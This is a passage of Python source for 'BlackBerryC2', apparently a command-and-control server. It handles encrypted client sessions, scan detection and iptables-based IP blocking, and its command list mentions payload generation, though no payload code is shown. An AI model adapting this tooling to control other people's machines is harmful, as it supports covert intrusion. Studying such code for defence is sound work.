#!/usr/bin/env python3
# BlackBerry - Servidor de administración remota RSA-OAEP AESGCM

import socket
import threading
import os
import struct
import time
import logging
import hashlib
import subprocess
import sys
import tempfile
import atexit
import pickle
import shlex
from queue import Queue, Empty
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec, dsa
from colores import *
from collections import defaultdict, deque
import json
import zlib
import argparse

# Importar prompt_toolkit
try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.completion import WordCompleter
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.styles import Style
    PROMPT_TOOLKIT_AVAILABLE = True
except ImportError:
    PROMPT_TOOLKIT_AVAILABLE = False
    print(f"{ALERT} {YELLOW}prompt_toolkit no disponible, usando input() básico{RESET}")

# Variables globales para control de verbosidad
VERBOSE_MODE = 0

ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 9
CHUNK_SIZE = 64 * 1024

script_dir = os.path.dirname(__file__)

# Módulo de Detección de Escaneos y Seguridad
SCAN_WINDOW = 60
MAX_CONNECTIONS_IN_WINDOW = 20
MAX_FAILED_HANDSHAKES = 2
MAX_BANNER_GRABS = 2
TEMP_BAN_DURATION = 1000

rejection_counters = defaultdict(lambda: {'count': 0, 'last_log': 0})
rejection_lock = threading.Lock()
REJECTION_LOG_THRESHOLD = 60

connection_behavior = defaultdict(lambda: {
    'timestamps': deque(maxlen=MAX_CONNECTIONS_IN_WINDOW * 2),
    'failed_handshakes': 0,
    'banner_grabs': 0
})
behavior_lock = threading.Lock()

temp_bans = {}
temp_bans_lock = threading.Lock()

def log_rejection_smart(ip, reason):
    """Sistema de log inteligente: registra cada 60 rechazos y sugiere iptables."""
    with rejection_lock:
        rejection_counters[ip]['count'] += 1
        count = rejection_counters[ip]['count']
        
        # En modo VERBOSE (-vv), solo mostrar las primeras 3 rechazos
        if VERBOSE_MODE == 2:
            if count <= 3:
                logging.info(f"Conexión #{count} rechazada de {ip} ({reason})")
            elif count == 4:
                logging.info(f"IP {ip}: Suprimiendo logs de rechazo subsecuentes (ya mostrados 3)")
        # En modo DEBUG (-v), mostrar todo pero cada 60
        elif VERBOSE_MODE == 1:
            if count % REJECTION_LOG_THRESHOLD == 0:
                logging.warning(
                    f"IP {ip} rechazada {count} veces ({reason}). "
                    f"Considere bloqueo con iptables: sudo iptables -A INPUT -s {ip} -j DROP"
                )
                rejection_counters[ip]['last_log'] = time.time()

def check_suspicious_behavior(ip):
    """Analiza el comportamiento de una IP y la bloquea temporalmente si es sospechoso."""
    with behavior_lock, temp_bans_lock:
        now = time.time()
        
        if ip in temp_bans and temp_bans[ip] > now:
            return

        behavior = connection_behavior[ip]
        
        recent_timestamps = [ts for ts in behavior['timestamps'] if now - ts <= SCAN_WINDOW]
        
        if len(recent_timestamps) > MAX_CONNECTIONS_IN_WINDOW:
            logging.warning(f"DETECCIÓN DE ESCANEO: Posible Connect Scan/Flood desde {ip} ({len(recent_timestamps)} conexiones en {SCAN_WINDOW}s).")
            temp_bans[ip] = now + TEMP_BAN_DURATION
            logging.error(f"SEGURIDAD: IP {ip} bloqueada temporalmente por {TEMP_BAN_DURATION} segundos.")
            behavior['timestamps'].clear()
            behavior['failed_handshakes'] = 0
            behavior['banner_grabs'] = 0
            return

        if behavior['failed_handshakes'] > MAX_FAILED_HANDSHAKES:
            logging.warning(f"DETECCIÓN DE ESCANEO: Posible escaneo de protocolo desde {ip} ({behavior['failed_handshakes']} handshakes fallidos).")
            temp_bans[ip] = now + TEMP_BAN_DURATION
            logging.error(f"SEGURIDAD: IP {ip} bloqueada temporalmente por {TEMP_BAN_DURATION} segundos.")
            behavior['timestamps'].clear()
            behavior['failed_handshakes'] = 0
            return
            
        if behavior['banner_grabs'] > MAX_BANNER_GRABS:
            logging.warning(f"DETECCIÓN DE ESCANEO: Posible Banner Grabbing desde {ip} ({behavior['banner_grabs']} desconexiones tras recibir banner).")
            temp_bans[ip] = now + TEMP_BAN_DURATION
            logging.error(f"SEGURIDAD: IP {ip} bloqueada temporalmente por {TEMP_BAN_DURATION} segundos.")
            behavior['timestamps'].clear()
            behavior['banner_grabs'] = 0
            return

connection_attempts = defaultdict(lambda: deque(maxlen=10))
MAX_ATTEMPTS = 5
WINDOW_TIME = 10

blocked_ips = set()
BLOCKED_IPS_FILE = os.path.join(script_dir, "blocked_ips.json")
blocked_ips_lock = threading.Lock()

SERVICE_BANNER = "BlackBerryC2 ~RSA-OAEP_AES-GCM v1.5"
SERVICE_BANNER_FILE = os.path.join(script_dir, "sVbanner.txt")

HEARTBEAT_TIMEOUT = 180
COMMAND_TIMEOUT = 45
INTERACTIVE_TIMEOUT = 300

os.makedirs(f"{script_dir}/logs", exist_ok=True)

TEMP_HISTORY_FILE = None

# Variable global para mantener el directorio de trabajo actual
CURRENT_WORKING_DIR = os.getcwd()

def setup_temp_history():
    """Crea un archivo temporal para el historial que se borra al salir."""
    global TEMP_HISTORY_FILE
    fd, TEMP_HISTORY_FILE = tempfile.mkstemp(prefix='blackberry_history_', suffix='.txt')
    os.close(fd)
    
    def cleanup_history():
        try:
            if TEMP_HISTORY_FILE and os.path.exists(TEMP_HISTORY_FILE):
                os.unlink(TEMP_HISTORY_FILE)
        except Exception:
            pass
    
    atexit.register(cleanup_history)
    return TEMP_HISTORY_FILE

def setup_logging(verbose=0):
    """Configura el sistema de logging según el modo verbose"""
    if verbose == 0:
        log_level = logging.WARNING
    elif verbose == 1:
        log_level = logging.DEBUG
    else:
        log_level = logging.INFO
    
    logger = logging.getLogger()
    logger.handlers.clear()
    logger.setLevel(log_level)
    
    file_formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
    console_formatter = logging.Formatter("%(levelname)s - %(message)s")
    
    file_handler = logging.FileHandler(f"{script_dir}/logs/BlackBerryServer.log")
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(file_formatter)
    logger.addHandler(file_handler)
    
    console_handler = logging.StreamHandler()
    console_handler.setLevel(log_level)
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)

HOST = '0.0.0.0'
PORT = 9949
server_socket = None
server_socket_lock = threading.Lock()
connections = {}
conn_lock = threading.Lock()
conn_id_counter = 0

RSA_CERT_DIR = os.path.join(script_dir, "rsa-cert")
RSA_PRIVATE_KEY_FILE = os.path.join(RSA_CERT_DIR, "server_private.pem")
RSA_PUBLIC_KEY_FILE = os.path.join(RSA_CERT_DIR, "server_public.pem")

SESSION_STATE_FILE = os.path.join(script_dir, "server_session.state")
SESSION_LOCK_FILE = os.path.join(script_dir, "server_session.lock")

def format_uptime(seconds):
    """Formatea segundos en formato legible (días, horas, minutos, segundos)"""
    if seconds < 0:
        return "N/A"
    
    days = int(seconds // 86400)
    hours = int((seconds % 86400) // 3600)
    minutes = int((seconds % 3600) // 60)
    secs = int(seconds % 60)
    
    parts = []
    if days > 0:
        parts.append(f"{days}d")
    if hours > 0:
        parts.append(f"{hours}h")
    if minutes > 0:
        parts.append(f"{minutes}m")
    if secs > 0 or not parts:
        parts.append(f"{secs}s")
    
    return " ".join(parts)

def save_session_state():
    """Guarda el estado actual del servidor"""
    try:
        state = {
            'pid': os.getpid(),
            'host': HOST,
            'port': PORT,
            'connections_count': len(connections),
            'timestamp': time.time()
        }
        with open(SESSION_STATE_FILE, 'wb') as f:
            pickle.dump(state, f)
        with open(SESSION_LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.debug(f"Error guardando estado de sesión: {e}")

def load_session_state():
    """Carga el estado del servidor anterior"""
    try:
        if os.path.exists(SESSION_STATE_FILE):
            with open(SESSION_STATE_FILE, 'rb') as f:
                return pickle.load(f)
    except Exception:
        pass
    return None

def cleanup_session_state():
    """Limpia el archivo de estado al cerrar"""
    try:
        if os.path.exists(SESSION_STATE_FILE):
            os.unlink(SESSION_STATE_FILE)
        if os.path.exists(SESSION_LOCK_FILE):
            os.unlink(SESSION_LOCK_FILE)
    except Exception:
        pass

def is_server_running():
    """Verifica si hay otra instancia del servidor corriendo"""
    try:
        if not os.path.exists(SESSION_LOCK_FILE):
            return False
        
        with open(SESSION_LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())
        
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            os.unlink(SESSION_LOCK_FILE)
            return False
    except Exception:
        return False

def load_or_generate_rsa_keys(persistent=False):
    """Carga o genera claves RSA según el modo"""
    if persistent:
        os.makedirs(RSA_CERT_DIR, exist_ok=True)
        
        if os.path.exists(RSA_PRIVATE_KEY_FILE) and os.path.exists(RSA_PUBLIC_KEY_FILE):
            try:
                with open(RSA_PRIVATE_KEY_FILE, 'rb') as f:
                    private_key = serialization.load_pem_private_key(
                        f.read(), password=None, backend=default_backend()
                    )
                with open(RSA_PUBLIC_KEY_FILE, 'rb') as f:
                    public_pem = f.read()
                
                logging.info(f"Claves RSA persistentes cargadas desde {RSA_CERT_DIR}")
                fingerprint = get_rsa_key_fingerprint(public_pem)
                if VERBOSE_MODE >= 2:
                    logging.info(f"Fingerprint RSA persistente: {fingerprint}")
                return private_key, public_pem
            except Exception as e:
                logging.warning(f"Error cargando claves persistentes: {e}. Generando nuevas...")
        
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        try:
            with open(RSA_PRIVATE_KEY_FILE, 'wb') as f:
                f.write(private_pem)
            os.chmod(RSA_PRIVATE_KEY_FILE, 0o600)
            
            with open(RSA_PUBLIC_KEY_FILE, 'wb') as f:
                f.write(public_pem)
            
            logging.info(f"Nuevas claves RSA persistentes generadas en {RSA_CERT_DIR}")
            fingerprint = get_rsa_key_fingerprint(public_pem)
            if VERBOSE_MODE >= 2:
                logging.info(f"Fingerprint RSA persistente: {fingerprint}")
            
        except Exception as e:
            logging.error(f"Error guardando claves persistentes: {e}")
            raise
        
        return private_key, public_pem
    else:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        logging.info("Par RSA temporal generado")
        return private_key, public_pem

def load_service_banner():
    """Carga el banner del servicio desde archivo o usa el por defecto."""
    global SERVICE_BANNER
    try:
        if os.path.exists(SERVICE_BANNER_FILE):
            with open(SERVICE_BANNER_FILE, 'r', encoding='utf-8') as f:
                banner = f.read().strip()
                if banner:
                    SERVICE_BANNER = banner
                    if VERBOSE_MODE >= 2:
                        logging.info(f"Banner cargado desde archivo: {SERVICE_BANNER}")
        else:
            save_service_banner()
    except Exception as e:
        logging.warning(f"Error cargando banner: {e}")

def save_service_banner():
    """Guarda el banner actual en archivo."""
    try:
        os.makedirs(os.path.dirname(SERVICE_BANNER_FILE), exist_ok=True)
        with open(SERVICE_BANNER_FILE, 'w', encoding='utf-8') as f:
            f.write(SERVICE_BANNER)
        if VERBOSE_MODE >= 2:
            logging.info(f"Banner guardado: {SERVICE_BANNER}")
        return True
    except Exception as e:
        logging.error(f"Error guardando banner: {e}")
        return False

def set_service_banner(new_banner):
    """Cambia el banner del servicio."""
    global SERVICE_BANNER
    if not new_banner or len(new_banner.strip()) == 0:
        return False, "El banner no puede estar vacío"
    
    if any(ord(c) < 32 and c not in ['\t', '\n', '\r'] for c in new_banner):
        return False, "El banner contiene caracteres de control inválidos"
    
    SERVICE_BANNER = new_banner.strip()
    if save_service_banner():
        return True, f"Banner cambiado a: {SERVICE_BANNER}"
    else:
        return False, "Error guardando el nuevo banner"

def get_rsa_key_fingerprint(public_key_pem):
    """Genera un fingerprint SHA256 de la clave pública RSA."""
    try:
        if isinstance(public_key_pem, bytes):
            pem_data = public_key_pem
        else:
            pem_data = public_key_pem.encode('utf-8')
        
        public_key = serialization.load_pem_public_key(pem_data)
        
        der_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        fingerprint = hashlib.sha256(der_bytes).hexdigest()
        formatted_fp = ':'.join(fingerprint[i:i+2] for i in range(0, len(fingerprint), 2))
        
        return formatted_fp
    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.exception(f"Error calculando fingerprint: {e}")
        return None

def is_socket_valid(sock):
    """Verifica si un socket sigue siendo válido."""
    try:
        sock.getpeername()
        return True
    except (OSError, AttributeError):
        return False

class ClientSession:
    def __init__(self, socket, address, aes_key, session_id):
        self.socket = socket
        self.address = address
        self.aes_key = aes_key
        self.session_id = session_id
        self.start_time = time.time()
        self.last_heartbeat = time.time()
        self.heartbeat_count = 0
        self.is_interactive = False
        self.command_queue = Queue()
        self.response_queue = Queue()
        self.lock = threading.Lock()
        self.bytes_sent = 0
        self.bytes_received = 0
        self.compressed_sent = 0
        self.compressed_received = 0
        self.supports_compression = True
        self.expected_file = None
        self.file_event = threading.Event()
        self.file_result = None
        self.pending_transfer = False
        
    def update_heartbeat(self):
        """Actualizar timestamp y contador de heartbeats de forma thread-safe."""
        with self.lock:
            self.last_heartbeat = time.time()
            self.heartbeat_count = getattr(self, "heartbeat_count", 0) + 1
    
    def is_alive(self):
        with self.lock:
            return time.time() - self.last_heartbeat < HEARTBEAT_TIMEOUT
    
    def set_interactive(self, interactive):
        with self.lock:
            self.is_interactive = interactive
    
    def add_bytes_sent(self, count, compressed=False):
        with self.lock:
            self.bytes_sent += count
            if compressed:
                self.compressed_sent += count
                self.supports_compression = True
    
    def add_bytes_received(self, count, compressed=False):
        with self.lock:
            self.bytes_received += count
            if compressed:
                self.compressed_received += count
                self.supports_compression = True

COMMANDS = [
    "help", "ayuda", "list", "clients", "select", "rsa-keys", 
    "set port", "set host", "generate-payload", "exit", "banner", 
    "payload", "proxy-tls", "proxy-tls-gui", "log", "cert", "new-cert", "cert new", 
    "block", "unblock", "blocklist", "sVbanner", "fingerprint", 
    "save-blocklist", "clean", "proxy-tls gui", "cd", "E", "e"
]

def validate_ip(ip):
    """Valida formato de dirección IP IPv4 simple."""
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            num = int(part)
            if not 0 <= num <= 255:
                return False
        return True
    except (ValueError, AttributeError):
        return False

def load_blocked_ips():
    """Carga la lista de IPs bloqueadas desde archivo con validación."""
    global blocked_ips
    try:
        if os.path.exists(BLOCKED_IPS_FILE):
            with open(BLOCKED_IPS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                raw_ips = data.get('blocked_ips', [])
                valid_ips = set()
                for ip in raw_ips:
                    if isinstance(ip, str) and validate_ip(ip):
                        valid_ips.add(ip)
                    else:
                        if VERBOSE_MODE >= 2:
                            logging.warning(f"IP inválida ignorada al cargar: {ip}")
                blocked_ips = valid_ips
                if VERBOSE_MODE >= 2:
                    logging.info(f"Cargadas {len(blocked_ips)} IPs bloqueadas desde {BLOCKED_IPS_FILE}")
        else:
            blocked_ips = set()
            if VERBOSE_MODE >= 2:
                logging.info("No existe archivo de IPs bloqueadas; iniciando con lista vacía")
    except json.JSONDecodeError as e:
        logging.error(f"Error JSON cargando IPs bloqueadas: {e}")
        blocked_ips = set()
    except (IOError, OSError) as e:
        logging.error(f"Error E/O cargando IPs bloqueadas: {e}")
        blocked_ips = set()
    except Exception as e:
        logging.exception(f"Error inesperado cargando IPs bloqueadas: {e}")
        blocked_ips = set()

def save_blocked_ips():
    """Guarda la lista de IPs bloqueadas en archivo de forma segura."""
    try:
        if os.path.exists(BLOCKED_IPS_FILE):
            try:
                backup_file = BLOCKED_IPS_FILE + '.backup'
                os.rename(BLOCKED_IPS_FILE, backup_file)
            except Exception as e:
                if VERBOSE_MODE == 1:
                    logging.debug(f"No se pudo crear backup del archivo de bloqueo: {e}")

        with blocked_ips_lock:
            data = {
                'blocked_ips': list(blocked_ips),
                'last_updated': time.time(),
                'version': '1.0'
            }

            os.makedirs(os.path.dirname(BLOCKED_IPS_FILE), exist_ok=True)

            temp_file = BLOCKED_IPS_FILE + '.tmp'
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

            os.rename(temp_file, BLOCKED_IPS_FILE)

        if VERBOSE_MODE >= 2:
            logging.info(f"Lista de IPs bloqueadas guardada ({len(blocked_ips)} IPs)")
        return True

    except (IOError, OSError) as e:
        logging.error(f"Error E/O guardando IPs bloqueadas: {e}")
        return False
    except Exception as e:
        logging.exception(f"Error inesperado guardando IPs bloqueadas: {e}")
        return False

def check_iptables_installed():
    """Verifica si iptables está instalado en el sistema."""
    try:
        result = subprocess.run(['which', 'iptables'], 
                              capture_output=True, 
                              text=True, 
                              timeout=5)
        return result.returncode == 0
    except Exception:
        return False

def install_iptables():
    """Intenta instalar iptables en el sistema."""
    print(f"{B_CYAN}[INFO] Intentando instalar iptables...{RESET}")
    
    package_managers = [
        (['apt-get', 'install', '-y', 'iptables'], 'apt-get'),
        (['yum', 'install', '-y', 'iptables'], 'yum'),
        (['dnf', 'install', '-y', 'iptables'], 'dnf'),
        (['pacman', '-S', '--noconfirm', 'iptables'], 'pacman'),
    ]
    
    for cmd, name in package_managers:
        try:
            result = subprocess.run(['which', name], 
                                  capture_output=True, 
                                  timeout=5)
            if result.returncode == 0:
                print(f"{B_CYAN}[INFO] Usando {name} para instalar iptables...{RESET}")
                install_result = subprocess.run(['sudo'] + cmd, 
                                              capture_output=True, 
                                              text=True, 
                                              timeout=60)
                if install_result.returncode == 0:
                    print(f"{B_GREEN}[+] iptables instalado exitosamente{RESET}")
                    return True
                else:
                    print(f"{ALERT} {RED}Error instalando iptables: {install_result.stderr}{RESET}")
                    return False
        except Exception:
            continue
    
    print(f"{ALERT} {RED}No se pudo detectar un gestor de paquetes compatible{RESET}")
    return False

def block_ip_with_iptables(ip, port=None):
    """Bloquea una IP usando iptables a nivel de firewall."""
    if not check_iptables_installed():
        print(f"{ALERT} {YELLOW}iptables no está instalado en el sistema{RESET}")
        try:
            install = input(f"{B_CYAN}¿Desea instalar iptables? (s/n): {RESET}").strip().lower()
            if install in ['s', 'si', 'sí', 'y', 'yes']:
                if not install_iptables():
                    return False
            else:
                print(f"{B_CYAN}[INFO] Omitiendo bloqueo con iptables{RESET}")
                return False
        except (KeyboardInterrupt, EOFError):
            print(f"\n{B_CYAN}[INFO] Omitiendo bloqueo con iptables{RESET}")
            return False
    
    try:
        check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-j', 'DROP']
        if port:
            check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
        
        result = subprocess.run(check_cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode == 0:
            print(f"{B_YELLOW}[!] La IP {ip} ya está bloqueada en iptables{RESET}")
            return True
        
        if port:
            cmd = ['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Bloqueando {ip} en puerto {port} con iptables...{RESET}")
        else:
            cmd = ['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Bloqueando {ip} completamente con iptables...{RESET}")
        
        result = subprocess.run(cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode == 0:
            print(f"{B_GREEN}[+] IP {ip} bloqueada exitosamente con iptables{RESET}")
            print(f"{B_YELLOW}[!] Para hacer este bloqueo persistente después de reiniciar:{RESET}")
            print(f"    {B_CYAN}sudo iptables-save > /etc/iptables/rules.v4{RESET}")
            return True
        else:
            print(f"{ALERT} {RED}Error bloqueando con iptables: {result.stderr}{RESET}")
            return False
            
    except subprocess.TimeoutExpired:
        print(f"{ALERT} {RED}Timeout ejecutando iptables{RESET}")
        return False
    except Exception as e:
        print(f"{ALERT} {RED}Error bloqueando con iptables: {e}{RESET}")
        return False

def unblock_ip_from_iptables(ip, port=None):
    """Desbloquea una IP de iptables si está bloqueada."""
    if not check_iptables_installed():
        if VERBOSE_MODE >= 2:
            logging.info("iptables no instalado, omitiendo desbloqueo de firewall")
        return False
    
    try:
        check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-j', 'DROP']
        if port:
            check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
        
        result = subprocess.run(check_cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode != 0:
            if VERBOSE_MODE >= 2:
                logging.info(f"La IP {ip} no está bloqueada en iptables")
            return False
        
        if port:
            cmd = ['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Desbloqueando {ip} del puerto {port} en iptables...{RESET}")
        else:
            cmd = ['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Desbloqueando {ip} de iptables...{RESET}")
        
        result = subprocess.run(cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode == 0:
            print(f"{B_GREEN}[+] IP {ip} desbloqueada de iptables{RESET}")
            return True
        else:
            print(f"{ALERT} {RED}Error desbloqueando de iptables: {result.stderr}{RESET}")
            return False
            
    except subprocess.TimeoutExpired:
        print(f"{ALERT} {RED}Timeout ejecutando iptables{RESET}")
        return False
    except Exception as e:
        print(f"{ALERT} {RED}Error desbloqueando de iptables: {e}{RESET}")
        return False

def block_ip(ip):
    """Bloquea una IP (persistente) con opción de iptables."""
    try:
        if not validate_ip(ip):
            logging.error(f"Intento de bloqueo con IP inválida: {ip}")
            return False

        with blocked_ips_lock:
            if ip in blocked_ips:
                print(f"{B_YELLOW}[!] IP {ip} ya estaba bloqueada a nivel de aplicación{RESET}")
            else:
                blocked_ips.add(ip)

        if not save_blocked_ips():
            with blocked_ips_lock:
                blocked_ips.discard(ip)
            return False
        
        print(f"{B_GREEN}[+] IP {ip} bloqueada a nivel de aplicación{RESET}")
        logging.warning(f"IP {ip} bloqueada permanentemente en aplicación.")
        
        try:
            use_iptables = input(f"\n{B_CYAN}¿Desea bloquear {ip} también con iptables (firewall del sistema)? (s/n): {RESET}").strip().lower()
            
            if use_iptables in ['s', 'si', 'sí', 'y', 'yes']:
                port_specific = input(f"{B_CYAN}¿Bloquear solo en el puerto {PORT}? (s/n, n=bloqueo total): {RESET}").strip().lower()
                
                if port_specific in ['s', 'si', 'sí', 'y', 'yes']:
                    block_ip_with_iptables(ip, PORT)
                else:
                    block_ip_with_iptables(ip)
        except (KeyboardInterrupt, EOFError):
            print(f"\n{B_CYAN}[INFO] Omitiendo bloqueo con iptables{RESET}")
        
        return True
    except Exception as e:
        logging.exception(f"Error bloqueando IP {ip}: {e}")
        return False

def unblock_ip(ip):
    """Desbloquea una IP persistente y verifica iptables."""
    try:
        if not validate_ip(ip):
            logging.error(f"Intento de desbloqueo con IP inválida: {ip}")
            return False

        with blocked_ips_lock:
            if ip not in blocked_ips:
                print(f"{B_YELLOW}[!] IP {ip} no estaba bloqueada a nivel de aplicación{RESET}")
            else:
                blocked_ips.discard(ip)

        if not save_blocked_ips():
            with blocked_ips_lock:
                blocked_ips.add(ip)
            return False
        
        print(f"{B_GREEN}[+] IP {ip} desbloqueada a nivel de aplicación{RESET}")
        logging.info(f"IP {ip} desbloqueada.")
        
        if check_iptables_installed():
            print(f"{B_CYAN}[INFO] Verificando bloqueos en iptables...{RESET}")
            unblocked_port = unblock_ip_from_iptables(ip, PORT)
            unblocked_total = unblock_ip_from_iptables(ip)
            
            if not unblocked_port and not unblocked_total:
                print(f"{B_CYAN}[INFO] La IP {ip} no estaba bloqueada en iptables{RESET}")
        
        return True
    except Exception as e:
        logging.exception(f"Error desbloqueando IP {ip}: {e}")
        return False

def is_ip_blocked(ip):
    """Comprueba si una IP está bloqueada de forma persistente."""
    try:
        with blocked_ips_lock:
            return ip in blocked_ips
    except Exception as e:
        logging.exception(f"Error verificando bloqueo de IP {ip}: {e}")
        return False

def is_ip_temp_banned(ip):
    """Verifica si una IP está bloqueada temporalmente."""
    try:
        with temp_bans_lock:
            if ip in temp_bans:
                if temp_bans[ip] > time.time():
                    return True
                else:
                    del temp_bans[ip]
                    return False
            return False
    except Exception as e:
        logging.exception(f"Error verificando ban temporal de IP {ip}: {e}")
        return False

def is_ip_allowed(ip):
    """Verifica si se permite la conexión desde `ip`."""
    try:
        if not validate_ip(ip):
            log_rejection_smart(ip, "formato inválido")
            return False

        if is_ip_blocked(ip):
            log_rejection_smart(ip, "bloqueo permanente")
            return False

        if is_ip_temp_banned(ip):
            log_rejection_smart(ip, "bloqueo temporal")
            return False

        now = time.time()
        attempts = connection_attempts[ip]
        attempts.append(now)

        while attempts and now - attempts[0] > WINDOW_TIME:
            attempts.popleft()

        if len(attempts) > MAX_ATTEMPTS:
            logging.warning(f"IP {ip} excedió límite de conexiones ({MAX_ATTEMPTS}/{WINDOW_TIME}s).")
            if len(attempts) > MAX_ATTEMPTS * 3:
                if block_ip(ip):
                    logging.warning(f"IP {ip} auto-bloqueada por exceso de intentos.")
            return False

        return True
    except Exception as e:
        logging.exception(f"Error verificando permisos para IP {ip}: {e}")
        return False

def BlackBerrybanner():
    try:
        import banners
        banners.main()
    except ImportError:
        print(f"{B_BLUE}{BOLD}Bienvenido a BlackBerry.{RESET}")
    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.exception("Error mostrando banner: %s", e)

SERVER_PRIVATE_KEY = None
SERVER_PUBLIC_PEM = None

def recvall(sock, n, timeout=30):
    """Recibe exactamente n bytes del socket con timeout configurado."""
    data = b''
    end = time.time() + timeout
    try:
        while len(data) < n:
            remaining = end - time.time()
            if remaining <= 0:
                return None
            
            try:
                sock.settimeout(min(1.0, remaining))
            except (OSError, ValueError) as e:
                if VERBOSE_MODE == 1:
                    logging.debug(f"Socket cerrado en recvall: {e}")
                return None
            
            try:
                packet = sock.recv(n - len(data))
                if packet == b'':
                    return b''
                data += packet
            except socket.timeout:
                if remaining <= 0:
                    return None
                continue
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                if VERBOSE_MODE == 1:
                    logging.debug(f"Conexión perdida en recvall: {e}")
                return None
                
    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.exception("Error en recvall: %s", e)
        return None
    return data

def send_encrypted_message(sock, plaintext, aes_key, timeout=30, session=None):
    """Envía un mensaje cifrado con AES-GCM. Añade un byte flag indicando si está comprimido."""
    try:
        sock.settimeout(timeout)

        if isinstance(plaintext, str):
            plaintext_bytes = plaintext.encode('utf-8', errors='replace')
        else:
            plaintext_bytes = plaintext

        flag = 0
        if ENABLE_COMPRESSION:
            try:
                compressed = zlib.compress(plaintext_bytes, level=COMPRESSION_LEVEL)
                if len(compressed) < len(plaintext_bytes):
                    payload_to_encrypt = compressed
                    flag = 1
                else:
                    payload_to_encrypt = plaintext_bytes
                    flag = 0
            except Exception:
                payload_to_encrypt = plaintext_bytes
                flag = 0
        else:
            payload_to_encrypt = plaintext_bytes
            flag = 0

        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, payload_to_encrypt, None)

        message = bytes([flag]) + nonce + ciphertext
        full_packet = struct.pack('!I', len(message)) + message
        sock.sendall(full_packet)
        
        if session:
            session.add_bytes_sent(len(full_packet), compressed=(flag == 1))
        
        return True
    except socket.timeout:
        if VERBOSE_MODE == 1:
            logging.warning(f"Timeout enviando mensaje después de {timeout}s")
        return False
    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.exception("Error enviando mensaje cifrado: %s", e)
        return False

def receive_encrypted_message(sock, aes_key, timeout=30, session=None):
    """Recibe y descifra un mensaje AES-GCM. Interpreta el flag de compresión."""
    try:
        raw_len = recvall(sock, 4, timeout)
        if raw_len is None:
            return None, 'timeout'
        if raw_len == b'':
            return None, 'closed'
        if len(raw_len) < 4:
            return None, 'incomplete'

        msg_len = struct.unpack('!I', raw_len)[0]
        data = recvall(sock, msg_len, timeout)
        if data is None:
            return None, 'timeout'
        if data == b'':
            return None, 'closed'
        if len(data) < 1 + 12:
            return None, 'incomplete'

        flag = data[0]
        nonce = data[1:13]
        ciphertext = data[13:]

        if session:
            session.add_bytes_received(4 + msg_len, compressed=(flag == 1))

        aesgcm = AESGCM(aes_key)
        try:
            plaintext_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        except Exception:
            return None, 'decrypt_error'

        if flag == 1:
            try:
                plaintext_bytes = zlib.decompress(plaintext_bytes)
                if session:
                    session.supports_compression = True
            except Exception:
                if VERBOSE_MODE == 1:
                    logging.warning("Fallo al descomprimir payload")
                return None, 'decompress_error'

        try:
            return plaintext_bytes.decode('utf-8'), 'ok'
        except Exception:
            return plaintext_bytes.decode('utf-8', errors='replace'), 'ok'

    except Exception as e:
        if VERBOSE_MODE == 1:
            logging.exception("Error recibiendo mensaje cifrado: %s", e)
        return None, 'error'

def accept_connections(sock):
    """Acepta conexiones entrantes, aplica bloqueos y establece sesiones cifradas."""
    global conn_id_counter
    while True:
        try:
            with server_socket_lock:
                if sock != server_socket:
